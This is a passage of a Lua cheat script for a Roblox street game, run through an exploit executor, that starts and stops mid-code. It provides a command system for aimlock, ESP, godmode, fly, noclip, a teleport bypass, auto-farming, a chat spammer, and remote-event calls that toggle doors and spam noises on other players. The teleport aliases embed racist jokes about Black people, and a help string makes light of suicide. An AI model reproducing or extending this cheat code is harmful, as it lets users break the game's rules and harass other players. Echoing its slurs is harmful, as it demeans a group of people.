end

local function Button2Down()
if Mouse.Target then 
        local Target = Mouse.Target.Parent 
        if Target:FindFirstChild'Lock' and Target:FindFirstChild'Click' and Target:FindFirstChild'Locker' then 
                if Target.Locker.Value then 
                                Target.Lock.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()
                                Target.Click.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()
                        else
                                Target.Click.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()
                                Target.Lock.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()
                        end
                end
        end
        if AimLock and AimlockMode == "RightClick" and KeyTable['Shift'] then 
                AimlockTarget = closestToMouse().Character
                local Connection;
                Connection = Players:GetPlayerFromCharacter(AimlockTarget).CharacterAdded:Connect(function(C)
                        if tostring(AimlockTarget) == tostring(C) then 
                                AimlockTarget = C 
                        else
                                Connection:Disconnect()
                        end 
                end)
                notif("AimlockTarget","has been set to"..AimlockTarget.Name,5,nil)
        end 
end

local function FreeCam(Speed)
if not GetChar():FindFirstChild'Head' then return end 
        if workspace:FindFirstChild'FreecamPart' then 
                workspace.FreecamPart:Destroy()
        end
        Speed = Speed or 35
        GetChar().Head.Anchored = true 
        local FreecamPart = Instance.new('Part',workspace)
        FreecamPart.Name = "FreecamPart"
        FreecamPart.Position = GetChar().Head.Position + Vector3.new(0,5,0)
        FreecamPart.Transparency = 1
        FreecamPart.CanCollide = false
        FreecamPart.Anchored = true
        workspace.CurrentCamera.CameraSubject = FreecamPart
        repeat wait()
                local Pos = Vector3.new()
                local Look = (workspace.CurrentCamera.Focus.p - workspace.CurrentCamera.CoordinateFrame.p).unit
                local PartPos = FreecamPart.Position
                if KeyTable['w'] then
                        Pos = Pos + Vector3.new(0,0,-1)
                elseif KeyTable['a'] then
                        Pos = Pos + Vector3.new(-1,0,0)
                elseif KeyTable['s'] then
                        Pos = Pos + Vector3.new(0,0,1)
                elseif KeyTable['d'] then
                        Pos = Pos + Vector3.new(1,0,0)
                elseif KeyTable['Space'] then
                        Pos = Pos + Vector3.new(0,1,0)
                elseif KeyTable['Control'] then
                        Pos = Pos + Vector3.new(0,-1,0)
                end 
                FreecamPart.CFrame = CFrame.new(PartPos,PartPos + Look) * CFrame.new(Pos * Speed)
        until not Freecam or GetChar().Humanoid.Health == 0
        workspace.CurrentCamera.CameraSubject = GetChar()
        GetChar().Head.Anchored = false 
        if workspace:FindFirstChild'FreecamPart' then 
                workspace.FreecamPart:Destroy()
        end
end

local function b(Text)
        DmgIndicator.Visible = true 
        DmgIndicator.Text = Text
        wait(5)
        DmgIndicator.Text = "" 
        DmgIndicator.Visible = false 
end 

local function Char(Plr)
local Tool = Plr:FindFirstChildOfClass'Tool'
        if Tool:FindFirstChild'Fire' then 
                return 'beamed u fucking win sped',Tool
        else 
                return 'hit you',Tool
        end
end 

getgenv().AddCommand = function(CommandF,Name,Alias,Help)
        Commands[#Commands + 1] = {['Function'] = CommandF,['Name'] = Name,['Alias'] = Alias,['Help'] = Help}
end
getgenv().FindCommand = function(Command)
        for i = 1,#Commands do 
                if Commands[i].Name:lower() == Command or AliasesEnabled and table.find(Commands[i].Alias,Command) then
                        return Help and Commands[i].Name.." "..Commands[i].Help or Commands[i].Function
                end
        end
end

getgenv().CheckCommand = function(Chat)
        Chat = string.gsub(Chat, "\r", "")
        local Arguments = string.split(Chat," ")
        local NCommand = FindCommand(table.remove(Arguments,1):lower())
        if NCommand then 
                local Work,Error = pcall(NCommand,Arguments)
                if not Work then 
                        wait(0.5)
                        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("There was an error with this command, I have set it to your clipboard. Send it to Cy (with the command you used) and it should be fixed next update.","All")
                        if setclipboard then 
                                setclipboard(Error)
                        else 
                                print(Error)
                        end
                end
        end
end

getgenv().PlrFinder = function(Plr)
local NewPlr,Player = Plr:lower(),Players:GetPlayers()
if #NewPlr == 2 and NewPlr == "me" then return LP end 
if NewPlr == "all" then return Player end 
        for i = 1,#Player do 
                if Player[i].Name:lower():sub(1,#NewPlr) == NewPlr then 
                        return Player[i]
                end
        end
end

local JustDoubleJumped = false 
local function HumanoidState(Old,New)
        if New == Enum.HumanoidStateType.Landed and JustDoubleJumped then 
                local Anim = Instance.new'Animation'
                Anim.AnimationId = "rbxassetid://129423030" 
                local AnimTrack = GetChar().Humanoid:LoadAnimation(Anim)
                wait(0.3)
                AnimTrack:play()
                JustDoubleJumped = false
        elseif New == Enum.HumanoidStateType.FallingDown or New == Enum.HumanoidStateType.PlatformStanding and NoGh or flying then
        GetChar().Humanoid.PlatformStand = false
                GetChar().Humanoid:ChangeState(8)
        end
end

local function DoubleJump()
        if GetChar() and GetChar().Humanoid and DoubleJumpEnabled then
            GetChar().Humanoid:ChangeState(3)
            local Anim = Instance.new'Animation'
            Anim.AnimationId = "rbxassetid://229782914"
            local AnimTrack = GetChar().Humanoid:LoadAnimation(Anim)
            AnimTrack:play(.1,1,1.5)
                JustDoubleJumped = true
        end
end

getgenv().find = function(Item)
  for i,v in pairs(workspace:GetChildren()) do 
      if v.Name == "RandomSpawner" and v:FindFirstChild'Model' then
      local Handle = v.Model.Handle
        if Item == "Cash" and Handle:FindFirstChildOfClass'MeshPart' and string.find(Handle:FindFirstChildOfClass'MeshPart'.MeshId,"511726060") then
          return v
        elseif Item == "Shotty" and Handle:FindFirstChild'Fire' and string.find(Handle.Fire.SoundId,"142383762") then 
          return v
        elseif Item == "Sawed Off" and Handle:FindFirstChild'Fire' and string.find(Handle.Fire.SoundId,"219397110") then 
          return v 
        elseif Item == "Uzi" and Handle:FindFirstChild'Fire' and string.find(Handle.Fire.SoundId,"328964620") then 
          return v 
        elseif Item == "All" then 
          return v
      end
    end
  end
end

local function uselessfunction(Thing)
local Model = Thing:WaitForChild('Model',10)
if Model then 
        local Handle = Thing.Model.Handle
                if Handle:FindFirstChildOfClass'MeshPart' and string.find(Handle:FindFirstChildOfClass'MeshPart'.MeshId,"511726060") then
                        return "Cash"
                elseif Handle:FindFirstChild'Fire' and string.find(Handle.Fire.SoundId,"142383762") then 
                        return "Shotty"
                elseif Handle:FindFirstChild'Fire' and string.find(Handle.Fire.SoundId,"219397110") then 
                        return "Sawed Off"
                elseif Handle:FindFirstChild'Fire' and string.find(Handle.Fire.SoundId,"328964620") then 
                        return "Uzi"
                elseif Handle:FindFirstChild'Blade' and string.find(Handle.Blade.TextureID,"12177251") then 
                        return "Katana"
                end
        end
end

local function addBillBoardGui(Item)
        local Itemx = uselessfunction(Item)
        if not Itemx then return end 
        local Esp1 = Instance.new("BillboardGui",Item)
        local Text = Instance.new("TextLabel",Esp1)
        Esp1.Adornee = Item
        Esp1.Size = UDim2.new(0,100,0,100)
        Esp1.StudsOffset = Vector3.new(0,1,0)
        Esp1.AlwaysOnTop = true
        Text.BackgroundTransparency = 1
        Text.Position = UDim2.new(0,0,0,0)
        Text.Size = UDim2.new(1,0,0,40)
        Text.TextColor3 = ItemEspColour
        Text.TextStrokeTransparency = 0.5
        Text.TextSize = 15
        Text.TextStrokeColor3 = ItemEspColour
        Text.Text = Itemx
end     

workspace.ChildAdded:Connect(function(Part)
        if Part.Name == "RandomSpawner" then
                if AutoFarm then 
                        farm("Cash")
                end
                if ItemEsp then 
                        addBillBoardGui(Part)
                end
        end
end)


getgenv().farm = function(Item)
  for i,v in pairs(workspace:GetChildren()) do 
        if v.Name == "RandomSpawner" then 
                if find(Item) and type(find(Item)) == "userdata" then 
                        Teleport(find(Item).CFrame)
                        wait(3)
                else 
                        notif("Farm "..Item,"None of "..Item.." on the map",5,"rbxassetid://1281284684")
                        break;
                end
      end
   end
end

AddCommand(function()
        AliasesEnabled = not AliasesEnabled
        notif("AliasesEnabled","Has been set to "..tostring(AliasesEnabled),5,nil) 
end,"usealias",{},"Turns on / off Aliases")

AddCommand(function(Arguments)
        if not Arguments[1] then 
                MainFrame.Visible = not MainFrame.Visible
        end
end,"help",{"commands","cmds"},"Gives you the commands help info")

AddCommand(function()
        local Btool = Instance.new('Tool',LP.Backpack)
        Btool.Name = "Zetox Btools" 
end,"btools",{},"Gives you Btools")

AddCommand(function()
        local Children = LP.PlayerGui.HUD:GetChildren()
        for i = 1,#Children do
                if Children[i]:IsA'Frame' then 
                        Children[i].Active = not Children[i].Active 
                        Children[i].Draggable = not Children[i].Draggable
                end
        end
end,"draggablegui",{},"Makes the HP/KO/Stamina bar draggable")

AddCommand(function()
        NoGh = not NoGh
        notif("Nogh","Has been set to "..tostring(NoGh),5,nil) 
end,"nogroundhit",{"nogh","antigh","antigroundhit"},"Makes it so you can't be ground hit")

AddCommand(function(Arguments)
        if not Arguments[1] then 
                GodMode = not GodMode
                GetChar():BreakJoints()
        end
end,"godmode",{"god"},"Gods your player (Breaks tools)")

AddCommand(function(Arguments)
        local Tool = GetChar():FindFirstChildOfClass'Tool'
    if Tool then
        Tool.Parent = LP.Backpack
        Tool.Grip = CFrame.new(Arguments[1] or 0,Arguments[2] or 0,Arguments[3] or 0) + Vector3.new(Arguments[4] or 0,Arguments[5] or 0,Arguments[6] or 0)
        Tool.Parent = GetChar()
    else 
        notif("NO TOOLS","ONE TOOL IS NEEDED",5,nil)
    end
end,"grippos",{"grip"},"[1 2 3 4 5 6] - changes grip pos to the arguments you set (First 3 are CFrame,last 3 are Vector)")

AddCommand(function(Arguments)
local GDesc = game:GetDescendants()
        for i = 1,Arguments[1] or 50 do 
                for i = 1,#GDesc do 
                        if GDesc[i]:IsA'Tool' and GDesc[i]:FindFirstChild'Click' then 
                                GDesc[i].Click:FireServer()
                                wait()
                        end
                end
        end
end,"spamclick",{},"spams the Click remote and makes annoying sounds")

AddCommand(function()
local WChild = workspace:GetChildren()
        for i = 1,#WChild do 
                if WChild[i].Name == "Door" and WChild[i]:FindFirstChild'Click' and WChild[i]:FindFirstChild'Lock' then
                        WChild[i].Lock.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()
                        WChild[i].Click.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()
                        wait()
                end
        end
end,"doors",{},"locks/unlocks doors")

local SpamDelay,SpamMessage,Spamming = 1,"Cyrus' Admin Or No Admin",false 
AddCommand(function(Arguments)
        if Arguments[1] then 
                SpamMessage = table.concat(Arguments," ")
        end 
        Spamming = not Spamming 
end,"spam",{},"Spams a message you set")

AddCommand(function(Arguments)
        SpamDelay = Arguments[1] or 1 
end,"spamdelay",{},"Delays the spam for [amount] Default: 1 second")

AddCommand(function()
local GDesc = game:GetDescendants()
        for i = 1,10 do 
                for i = 1,#GDesc do 
                        if GDesc[i]:IsA'Tool' and GDesc[i]:FindFirstChild'Click' then 
                                GDesc[i].Click:FireServer()
                        end
                end
        end
end,"muteallradios",{"muteradios"},"Mutes all radios (does not loop)")

AddCommand(function(Arguments)
        if Arguments[1] then 
                Normalwalk = true
                WalkShoot = true 
                GetChar().Humanoid.WalkSpeed = Arguments[1]
                WalkSpeed = Arguments[1]
        end
end,"speed",{"ws"},"Changes your Humanoids WalkSpeed")

AddCommand(function()
        WalkShoot = not WalkShoot
end,"walkshoot",{"noslow"},"Allows you to turn on / off walk shooting")

AddCommand(function(Arguments)
        Normalwalk = false
        ControlSpeed = Arguments[1]
        updateSettings()
end,"crouchspeed",{"cspeed"},"Changes your Crouching speed")

AddCommand(function(Arguments)
        Normalwalk = false
        ShiftSpeed = Arguments[1]
        updateSettings()
end,"sprintspeed",{"sspeed"},"Changes your sprinting speed")

AddCommand(function(Arguments)
        GetChar().Humanoid.HipHeight = Arguments[1]
end,"hipheight",{"hh"},"Changes your Humanoids HipHeight")

AddCommand(function(Arguments)
        GetChar().Humanoid.JumpPower = Arguments[1]
end,"jumppower",{"jp"},"Changes your Humanoids JumpPower")

AddCommand(function(Arguments)
        if not Arguments[1] then 
                TeleportService:TeleportToPlaceInstance(game.PlaceId,game.JobId)
        end
end,"rejoin",{"rj"},"Rejoins your CURRENT game server")

AddCommand(function(Arguments)
        if not Arguments[1] then 
                GetChar():BreakJoints()
        end
end,"reset",{"re"},"SUICIDE IS PAINLESS IT BRINGS ON MANY CHANGES")

AirWalk.Anchored = true 
AirWalk.Size = Vector3.new(5,1,5)
AirWalk.Transparency = 1 
AirWalk.Material = "Neon"
AddCommand(function(Arguments)
        AirWalkOn = not AirWalkOn 
        AirWalk.Parent = AirWalkOn and workspace or not AirWalkOn and nil 
end,"airwalk",{},"Allows you to float in the air")

local NeverSitting = false 
AddCommand(function()
NeverSitting = not NeverSitting
        if NeverSitting then
                local toParent = workspace:GetDescendants()
                for i = 1,#toParent do 
                        if string.find(toParent[i].ClassName:lower(),'seat') then 
                                toParent[i].Parent = CoreGui
                        end
                end
        else
                local toParent = CoreGui:GetChildren()
                for i = 1,#toParent do 
                        if string.find(toParent[i].ClassName:lower(),'seat') then 
                                toParent[i].Parent = workspace
                        end
                end
        end
end,"neversit",{"nsit"},"Never sit")

AddCommand(function()
        AutoDie = not AutoDie
end,"autodie",{"autoreset"},"When Ko'ed auto kills you")

AddCommand(function()
        Noclipping = not Noclipping
        notif("Command: Noclip: ","Noclip has been set to "..tostring(Noclipping),5,"rbxassetid://1281284684")
end,"noclip",{},"Allows you to walk through walls")

AddCommand(function(Arguments)
        if Arguments[1] then 
                local Player = PlrFinder(Arguments[1])
                if Player and Player.Character and Player.Character:FindFirstChild'Head' and Player ~= LP then 
                        Teleport(Player.Character.Head.CFrame)
                end
        end
end,"goto",{"to"},"Teleports you to the selected player")

AddCommand(function()
        TpBypass = not TpBypass
        GetChar():BreakJoints()
end,"tpbypass",{},"Turns on tp bypass")

AddCommand(function(Arguments)
        if Arguments[1] and tonumber(Arguments[1]) then 
                ClockTime = Arguments[1]
        end
end,"time",{},"Changes the time to the number you set")

AddCommand(function(Arguments)
        Blinking = not Blinking
        if Blinking then 
                if not Arguments[1] or not tonumber(Arguments[1]) then 
                        BlinkSpeed = 2
                else 
                        BlinkSpeed = Arguments[1]
                end
        end
        notif("Blinking","Has been set to "..tostring(Blinking),5,nil) 
end,"blink",{},"Another form of speed, Uses CFrame")

AddCommand(function(Arguments)
        if Arguments[1] then 
                if Arguments[1]:lower() == "shift" then
                        BlinkMode = "Shift"
                elseif Arguments[1]:lower() == "none" then 
                        BlinkMode = "None" -- giving people the illusion of free choice is my motto!
                end
                updateSettings()
        end 
end,"blinkmode",{},"Changes Blinkmode")

AddCommand(function(Arguments)
        if readfile and writefile then
                if Arguments[1] then
                        if Arguments[1]:lower() == "default" then
                                Config = "CyrusStreetsAdminSettings"
                                runsettings()
                        elseif pcall(readfile,Arguments[1]) then
                                Config = Arguments[1]
                                runsettings(Arguments[1])
                        else
                                Config = Arguments[1]
                                savesettings()
                                runsettings()
                        end 
                end 
        end 
end,"config",{},"Changes Config") 

AddCommand(function(Arguments)
        if Arguments[1] then
                Arguments[1] = Arguments[1]:lower()
                if Arguments[1] == "banland" then 
                        TeleportService:Teleport(4669040)
                elseif Arguments[1] == "normalstreets" then 
                        TeleportService:Teleport(455366377)
                elseif Arguments[1] == "uzi" then 
                        GrabThing("Uzi",GetChar().Head.CFrame)
                elseif Arguments[1] == "machete" then 
                        GrabThing("Machete",GetChar().Head.CFrame)
                elseif Arguments[1] == "spray" then 
                        GrabThing("Spray",GetChar().Head.CFrame)
                elseif Arguments[1] == "sawed" or Arguments[1] == "sawedoff" then 
                        GrabThing("SawedOff",GetChar().Head.CFrame)
                elseif Arguments[1] == "pipe" then 
                        GrabThing("Pipe",GetChar().Head.CFrame)
                elseif Arguments[1] == "glock" then 
                        GrabThing("Glock",GetChar().Head.CFrame)
                elseif PartTable and Arguments[1] == "sand" or Arguments[1] == "sandbox" then
                        Teleport(CFrame.new(-178.60614013672,3.2000000476837,-117.21733093262))
                elseif PartTable and Arguments[1] == "prison" or Arguments[1] == "jail" or Arguments[1] == "whereblacksgoaftertheyattempttorobsaidbank" then 
                        Teleport(CFrame.new(-978.74725341797,3.199854850769,-78.541763305664))
                elseif PartTable and Arguments[1] == "gas" or Arguments[1] == "gasstation" then 
                        Teleport(CFrame.new(99.135276794434,18.599975585938,-73.462348937988))
                elseif PartTable and Arguments[1] == "court" or Arguments[1] == "basketballcourt" then 
                        Teleport(CFrame.new( -191.56864929199,3,223.43171691895))
                elseif PartTable and Arguments[1] == "beach" then 
                        Teleport(CFrame.new(-663.97521972656,1.8657279014587,-369.04748535156))
                elseif PartTable and Arguments[1] == "bank" or Arguments[1] == "whatblacksrob" then
                        Teleport(CFrame.new(-270.44195556641,4.8757019042969,133.12774658203))
                end
        end
end,"tpto",{"tp"},"Teleports to places [banland/normalstreets/uzi/machete/spray/sawed/sawedoff/pipe/sand/prison/gas/court/beach/bank]")

local FlySpeed = 10
local FirstFly = true  
local function fly(SPEED) -- CREDITS TO INFINITE YIELD FOR THIS FLY METHOD (I'M PLANNING TO MAKE MY OWN SOON)
FlySpeed = SPEED or 10
        local T = GetChar():FindFirstChild'HumanoidRootPart' or GetChar():FindFirstChild'Torso'
        if not AirWalkOn then
                CheckCommand("airwalk") -- decided to use airwalk since it works the best
        end 
        local CONTROL = {F = 0, B = 0, L = 0, R = 0}
        local lCONTROL = {F = 0, B = 0, L = 0, R = 0}
        local function fly()
                flying = true
                local BG = Instance.new('BodyGyro', T)
                local BV = Instance.new('BodyVelocity', T)
                BG.P = 9e4
                BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
                BG.cframe = T.CFrame
                BV.velocity = Vector3.new(0, 0.1, 0)
                BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
                spawn(function()
                repeat wait()
                if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 then
                SPEED = 50
                elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0) and SPEED ~= 0 then
                SPEED = 0
                end
                if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 then
                BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
                lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
                elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and SPEED ~= 0 then
                BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
                else
                BV.velocity = Vector3.new(0, 0.1, 0)
                end
                BG.cframe = workspace.CurrentCamera.CoordinateFrame
                                until not flying
                                CONTROL = {F = 0, B = 0, L = 0, R = 0}
                                lCONTROL = {F = 0, B = 0, L = 0, R = 0}
                                SPEED = 0
                                BG:destroy()
                                BV:destroy()
                                LP.Character:FindFirstChildOfClass'Humanoid'.PlatformStand = false
                                if AirWalkOn then
                                        CheckCommand("airwalk")
                                end 
                        end)
                end
        Mouse.KeyDown:connect(function(KEY)
                if KEY:lower() == 'w' then
                        CONTROL.F = FlySpeed
                elseif KEY:lower() == 's' then
                        CONTROL.B = -FlySpeed
                elseif KEY:lower() == 'a' then
                        CONTROL.L = -FlySpeed 
                elseif KEY:lower() == 'd' then 
                        CONTROL.R = FlySpeed
                end
        end)
        Mouse.KeyUp:connect(function(KEY)
                if KEY:lower() == 'w' then
                        CONTROL.F = 0
                elseif KEY:lower() == 's' then
                        CONTROL.B = 0
                elseif KEY:lower() == 'a' then
                        CONTROL.L = 0
                elseif KEY:lower() == 'd' then
                        CONTROL.R = 0
                end
        end)
        fly()
        if FirstFly then
                flying = false 
                wait(0.5)
                fly()
                FirstFly = false
        end
end

AddCommand(function(Arguments)
        if not flying then
                fly(Arguments[1] and tonumber(Arguments[1]) or 10)
        else 
                flying = false 
        end
end,"fly",{"f"},"Allows you to be like a bird")

AddCommand(function(Arguments)
        if Arguments[1] then 
                if Arguments[1]:lower() == "normal" then 
                        workspace.CurrentCamera.FieldOfView = OldFov
                elseif tonumber(Arguments[1]) then 
                        workspace.CurrentCamera.FieldOfView = Arguments[1]
                end 
        end 
end,"fov",{},"Changes Field Of View")

AddCommand(function(Arguments)
        if Arguments[1] then 
                if string.lower(Arguments[1]) == "ws" or string.lower(Arguments[1]) == "speed" then 
                        GetChar():FindFirstChildWhichIsA'Humanoid'.WalkSpeed = Arguments[2]
                        Normalwalk = true
                        SpawnWS = Arguments[2] or NormalWS
                elseif string.lower(Arguments[1]) == "jp" or string.lower(Arguments[1]) == "jumppower" then 
                        GetChar():FindFirstChildWhichIsA'Humanoid'.JumpPower = Arguments[2]
            SpawnJP = Arguments[2] or NormalJP
        elseif string.lower(Arguments[1]) == "hh" or string.lower(Arguments[1]) == "hipheight" then
         GetChar():FindFirstChildWhichIsA'Humanoid'.HipHeight = Arguments[2] 
                        SpawnHH = Arguments[2] or NormalHH
                end
        end
end,"loop",{},"[Ws/Speed/Jp/JumpPower/HH/HipHeight/]")

AddCommand(function(Arguments)
        if Arguments[1] then
        local v = PlrFinder(Arguments[1])
                if v then 
                        if not Arguments[2] then
                                notif(v.Name,"Is on "..v.OsPlatform.." and is "..v.AccountAge.." days old",5,nil)
                elseif Arguments[2] and Arguments[2]:lower() == "os" or Arguments[2]:lower() == "operatingsystem" then 
                                notif(v.Name,"is on "..v.OsPlatform,5,nil)
                elseif Arguments[2] and Arguments[2]:lower() == "age" or Arguments[2]:lower() == "accountage" or Arguments[2]:lower() == "accage" then 
                                notif(v.Name,"has the account age of "..v.AccountAge,5,nil)
                        end
                end
        else
                notif(LP.Name,"you are on "..LP.OsPlatform.."(duh) and your Account Age is "..LP.AccountAge,5,nil)
        end
end,"playerinfo",{"info"},"PlayerInfo/Info [Player] [Os/OperatingSystem/AccAge/Age/Accountage/none]")

local AntiAim = false 
AddCommand(function()
        if AntiAim then 
                local Tracks = GetChar().Humanoid:GetPlayingAnimationTracks()
                for i = 1,#Tracks do 
                        if string.find(Tracks[i].Animation.AnimationId,"215384594") then 
                                Tracks[i]:Stop()
                        end
                end
        else
                local Anim = Instance.new'Animation'
                Anim.AnimationId = "rbxassetid://215384594"
                GetChar().Humanoid:LoadAnimation(Anim):play(5,45,250)
        end
        AntiAim = not AntiAim
end,"antiaim",{},"breaks shitty aimbots lol")

AddCommand(function()
if not PartTable then notif("Sorry,","This command only works on streets.",5,nil) return end
local PartFound = GetChar():FindFirstChild'HumanoidRootPart' or GetChar():FindFirstChild'Torso'
math.randomseed(os.time())
        if workspace:FindFirstChild'Cars' then 
                local Car = workspace.Cars:GetDescendants()
                for i = 1,#Car do
                        local i = math.random(1,#Car)
                        if Car[i]:IsA'VehicleSeat' and Car[i].Name == "Drive" and not Car[i].Occupant then 
                                PartFound.CFrame = Car[i].CFrame
                        end
                end
        else 
                notif("Command: BringCar","no cars to bring",nil)
        end 
end,"bringcar",{},"Brings a car (Streets only)")

AddCommand(function(Arguments)
        if Arguments[1] and #Arguments[1] == 1 and Arguments[2] and Keys then
                for Index,Key in pairs(Keys) do
                if Key:match("[%a%d]+$") == Arguments[1]:lower() then
                                table.remove(Keys,Index)
                        end
                end
                local Hotkey = table.remove(Arguments, 1)
                Keys[#Keys + 1] = table.concat(Arguments, " ").."||"..Hotkey
                if writefile and readfile then 
                        updateSettings()
                end
        end
end,"hotkey",{"key"},"Hotkeys a command to a key")

AddCommand(function()
if not PartTable then notif("Sorry,","This command only works on streets.",5,nil) return end 
if TpBypass then notif("Due to snakes code","you can not use burgers/drinks with the tpbypass") return end
        if GrabThing("Burger",GetChar().Head.CFrame) then
                local Hamborger = LP.Backpack:FindFirstChild'Burger'
                if Hamborger then 
                        Hamborger.Parent = GetChar()
                        Hamborger:Activate() -- CHEEMS
                        repeat RunService.Heartbeat:Wait() until Hamborger.Parent ~= LP.Character
                end
        end
        if GrabThing("Drink",GetChar().Head.CFrame) then
                local Drink = LP.Backpack:FindFirstChild'Drink'
                if Drink then 
                        Drink.Parent = GetChar()
                        Drink:Activate()
                end 
        end
end,"heal",{"h"},"Heals you")

AddCommand(function(Arguments)
        if not PartTable then notif("Sorry,","This command only works on streets.",5,nil) return end 
        HealBot = not HealBot 
        if Arguments[1] and Arguments[2] and tonumber(Arguments[2]) and Arguments[1] == "health" then 
                HealBotHealth = tonumber(Arguments[2])
        end 
        notif("HealBot","Has been set to "..tostring(HealBot),5,nil) 
end,"healbot",{},"Turns on auto healing at a set health (Defaults at 25 hp")

AddCommand(function()
        if not PartTable then notif("Sorry,","This command only works on streets.",5,nil) return end 
        if not GetChar():FindFirstChildOfClass'Tool' then notif("Tool needed","Hold a gun",5,nil) return end 
        GrabThing("Ammo",GetChar().Head.CFrame)
end,"reload",{"r"},"Gives your current gun ammo")

AddCommand(function()
        DoubleJumpEnabled = not DoubleJumpEnabled
        notif("Command: DoubleJump","has been set to "..tostring(DoubleJumpEnabled),5,"rbxassetid://1281284684")
end,"doublejump",{},"Allows you to jump infitely")

AddCommand(function(Arguments)
        if Arguments[1] then
                for Index,Key in pairs(Keys) do
                if Key:match("[%a%d]+$") == Arguments[1]:lower() then
                                table.remove(Keys,Index)
                        end
                end
        end
end,"removekey",{"rkey"},"Removes a hotkey to a command")

AddCommand(function()
        LP:Kick'SHUT'
end,"sex",{},"Added sex now shut up about it in cyadmin suggestions")

AddCommand(function()
        Keys = {}
        ClickTpKey = ""
        updateSettings()
end,"removeallhotkeys",{"removeallkeys"},"Removes all hotkeys")

AddCommand(function(Arguments)
        if Arguments[1] then
                Arguments[1] = Arguments[1]:lower()
                if Arguments[1] == "outline" then 
                        Cframe.BackgroundColor3 = Color3.fromRGB(Arguments[2] or 0,Arguments[3] or 0,Arguments[4] or 0)
                elseif Arguments[1] == "text" then 
                        CText.BackgroundColor3 = Color3.fromRGB(Arguments[2] or 0,Arguments[3] or 0,Arguments[4] or 0)
                elseif Arguments[1] == "background" then 
                        CmdFrame.BackgroundColor3 = Color3.fromRGB(Arguments[2] or 0,Arguments[3] or 0,Arguments[4] or 0)
                elseif Arguments[1] == "damageindicator" then 
                        DmgIndicator.TextColor3 = Color3.fromRGB(Arguments[2] or 0,Arguments[3] or 0,Arguments[4] or 0)
                elseif Arguments[1] == "cmds" then 
                        local Child = CmdFrame:GetChildren() 
                        for i = 1,#Child do 
                                if Child[i]:IsA'TextLabel' then 
                                        Child[i].BackgroundColor3 = Color3.fromRGB(Arguments[2] or 0,Arguments[3] or 0,Arguments[4] or 0)
                                end
                        end
                elseif Arguments[1] == "bullet" then
                        BulletColour = ColorSequence.new(Color3.fromRGB(Arguments[2] or 0,Arguments[3] or 0,Arguments[4] or 0))
                elseif Arguments[1] == "values" then 
                        DrawingT.Color = Color3.fromRGB(Arguments[2] or 0,Arguments[3] or 0,Arguments[4] or 0)
                elseif Arguments[1] == "itemesp" then
                        ItemEspColour = Color3.fromRGB(Arguments[2] or 0,Arguments[3] or 0,Arguments[4] or 0)
                elseif Arguments[1] == "esp" then 
                        EspColour = Color3.fromRGB(Arguments[2] or 0,Arguments[3] or 0,Arguments[4] or 0)
                else
                        notif("Command: Colour","Colour: [BackGround/Text/Outline/cmds/damageindicator/bullet/values/itemesp/esp] [rgb]",5,"rbxassetid://1281284684")
                end
        end
end,"colour",{"color"},"Changes elements colours Colour [BackGround/Text/Outline/cmds/damageindicator/bullet/values/itemesp/esp]")

AddCommand(function(Arguments)
        if Arguments[1] then
                ClickTpKey = string.sub(Arguments[1],1,1)
                if readfile and writefile then 
                        updateSettings()
                end
        end
end,"clicktp",{"ctp"},"Allows you to teleport around the map with a Key")

local ViewPlayerConnection,ViewPlayerConnection2;
AddCommand(function(Arguments)
        if Arguments[1] then 
        local Plr = PlrFinder(Arguments[1]) 
                if Plr and Plr.Character then
                        if ViewPlayerConnection then ViewPlayerConnection:Disconnect() ViewPlayerConnection = nil ViewPlayerConnection2:Disconnect() ViewPlayerConnection2 = nil end 
                        workspace.CurrentCamera.CameraSubject = Plr.Character
                        if Arguments[2] and Arguments[2] == "loop" then
                                ViewPlayerConnection = Plr.CharacterAdded:Connect(function(C)
                                        workspace.CurrentCamera.CameraSubject = C
                                end)
                                LP.CharacterAdded:Connect(function(C)
                                        if Plr.Character then
                                                workspace.CurrentCamera.CameraSubject = Plr.Character -- I don't know if this does anything I coded it at 7am but I remember someone saying view plr loop doesn't work when you respawn so
                                        end
                                end)
                        end
                end
        end
end,"view",{},"Allows you to look through a players vision")

AddCommand(function()
        if ViewPlayerConnection and ViewPlayerConnection2 then ViewPlayerConnection:Disconnect() ViewPlayerConnection2:Disconnect() ViewPlayerConnection = nil ViewPlayerConnection2 = nil end 
        workspace.CurrentCamera.CameraSubject = GetChar()
end,"unview",{},"Brings you back to your normal vision")

local HR;
AddCommand(function(Arguments)
if not GetChar():FindFirstChild'HumanoidRootPart' then notif("Sorry","this can be only used without tpbypass on",5,nil) end
        if HR then
                local CFramex = HR.CFrame
                HR:Destroy()
                HR = nil
                wait(0.5)
                Teleport(CFramex)
                workspace.CurrentCamera.CameraSubject = GetChar()
        else 
                local old = GetChar().HumanoidRootPart.CFrame
                HR = GetChar().HumanoidRootPart:Clone()
                HR.Parent = GetChar()
                workspace.CurrentCamera.CameraSubject = GetChar().Head
                HR.CFrame = CFrame.new(10000,0,10000)
                HR.CFrame = old
        end
end,"fblink",{},"Allows you to \"blink\" around the map")

AddCommand(function(Arguments)
        if not Freecam then
                Freecam = true 
                FreeCam(Arguments[1])
        else
